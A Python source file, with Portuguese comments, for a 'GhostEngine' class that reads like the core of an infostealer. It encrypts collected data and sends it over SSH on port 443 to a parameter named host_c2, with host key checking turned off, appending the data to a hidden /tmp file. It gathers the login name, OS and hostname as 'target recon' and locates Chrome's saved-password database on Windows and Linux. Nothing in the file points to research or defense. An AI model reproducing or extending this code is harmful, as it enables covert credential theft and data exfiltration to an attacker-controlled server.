import paramiko
from cryptography.fernet import Fernet
import os
import platform
import socket

class GhostEngine:
    def __init__(self, key_path="nexus_prime.key"):
        if not os.path.exists(key_path):
            raise FileNotFoundError(f"Chave {key_path} necessária.")
        with open(key_path, "rb") as f:
            self.cipher = Fernet(f.read())
            
    def cifrar_dados(self, texto):
        return self.cipher.encrypt(texto.encode())

    def transmitir_via_tunel(self, host_c2, user, pkey_path, payload_cifrado):
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(host_c2, port=443, username=user, key_filename=pkey_path, timeout=10)
            ssh.exec_command(f"echo {payload_cifrado.decode()} >> /tmp/.nexus_ghost")
            ssh.close()
            return True
        except:
            return False

    def scan_local_credentials(self):
        """[PASSO A] Recon de Sistema"""
        try:
            return f"TARGET: {os.getlogin()} | OS: {platform.system()} | NODE: {platform.node()}"
        except:
            return "Erro no Recon local."

    def shadow_cookie_scan(self):
        """[PASSO B] Recon de Navegador"""
        if platform.system() == "Windows":
            path = os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data\Default\Login Data"
        else:
            path = os.path.expanduser("~") + "/.config/google-chrome/Default/Login Data"
        return f"SHADOW-COOKIE: Localizado em {path}" if os.path.exists(path) else "SHADOW-COOKIE: Não encontrado."
